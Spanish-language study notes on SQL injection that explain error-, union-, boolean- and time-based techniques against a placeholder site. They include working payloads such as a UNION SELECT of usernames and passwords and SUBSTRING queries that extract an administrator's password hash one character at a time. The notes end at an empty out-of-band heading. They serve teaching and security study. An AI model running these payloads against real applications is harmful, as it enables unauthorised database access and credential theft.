# Inyección SQL

## Tipos de inyección SQL

- In-Band (Classic).
  - Error.
  - Union.
- Inferential (Blind).
  - Boolean.
  - Time.
- Out-of-Band.

### In-Band (Classic)

- Ocurren cuando el atacante usa el mismo canal de comunicación tanto para lanzar el ataque como para obtener el resultado del ataque.
  - La data obtenida es presentada directamente en la página web de la aplicación.
- Es más fácil de expotar en comparación con otras categorías de SQLi.
- Existen dos tipos:
  - Error-based SQLi.
  - Union-based SQLi.

#### Error-based SQLi

- Es una técnica empleada para forzar a la base de datos a generar un error, dándodle al atacante información para poder redefinir la inyección.
- Ejemplo:

Input:

`www.random.com/app.php?id='`

Output:

`You have an error in your SQL syntax, check the manual that corresponds to your MySQL server version...`

En este caso se estaría agregando como valor del parámetro `id` el caracter `'` (comilla simple) para causar el error, añadiendo este caracter a la consulta generada por la aplicación.

#### Union-based SQLi

- Es una técnica que emplea el operador SQL `UNION` para combinar los resultados de dos consultas en un sólo set de resultados.
- Ejemplo:

Input:

`www.random.com/app.php?id=' UNION SELECT username, password FROM users--`

Output:

```
carlos
rtdgfdfcv0uc90xc
administrator
xdr3asrt3'0o90ki
```

En este caso el output de la segunda consulta se pudiera visualizar en los campos o lugares correspondientes a la consulta que normalmente hace la aplicación.

### Inferential (Blind)

- Es una vulnerabilidad donde no existe como tal una transferencia de datos por medio de la aplicación web.
- Independientemente que el atacante no pueda desplegar información directamente de la base de datos no le resta peligrosidad a la vulnerabilidad.
  - El atacante tiene la capacidad de reconstruir información al enviar ciertas peticiones y observar los resultados del comportamiento del servidor de base de datos.
- Toma más tiempo que las inyecciones In-Band.
- Existen dos tipos:
  - Boolean-based SQLi.
  - Time-based SQLi.

#### Boolean-based Blind SQLi

- Es una técnica que emplea condiciones booleanas para devolver diferentes resultados dependiendo de si la consulta generada retorna `TRUE` o `FALSE`.

URL de ejemplo:

`www.random.com/app.php?id=1`

Consulta de Backend:

`select title from product where id = 1`

Payload #1 (FALSE)

`www.random.com/app.php?id=1 and 1=2`

Consulta de Backend:

`select title from product where id = 1 and 1=2`

Payload #2 (TRUE)

`www.random.com/app.php?id=1 and 1=1`

Consulta de Backend:

`select title from product where id = 1 and 1=1`

##### Caso Práctico

Se busca extraer el hash del usuario `Administrator` de la tabla de usuarios.

Tabla Users:

`Administrator / 4cfef044f55be76daef66309146c60b5`

Payload:

`www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'`

Consulta de Backend:

`select title from product where id = 1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'`

Al enviar el payload no retorna ningún producto la página, por lo tanto devuelve `FALSE` con lo que se puede concluir que `'s'` no es el primer caracter del hash de la contraseña.

Este proceso se vuelve iterativo por lo que se puede probar con todos los caracteres disponibles. Tomando en cuenta el caso práctico para devolver `TRUE` quedaría de la siguiente manera.

Payload:

`www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = '4'`

Consulta de Backend:

`select title from product where id = 1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = '4'`

De esta manera se cumplen ambas condiciones, es decir, que exista un producto con el id 1 y que el primer caracter del hash es `4`. Siendo así la consulta devolverá por ende `TRUE`.

#### Time-based SQLi

- Es una técnica que emplea el pausado de la base de datos por un cierto periodo de tiempo para después retornar los resultados, indicando una ejecución correcta de la consulta de SQL.
- Ejemplo de consulta a la base de datos:

Si el primer caracter del hash de la contraseña del usuario administrator es 'a', realiza una pausa por 10 segundos.

- Si la respuesta tarda en responder 10 segundos, el primer caracter es 'a'.
- Si la respuesta no tarda en responder 10 segundos, el primer caracter no es 'a'.

### Out-of-Band

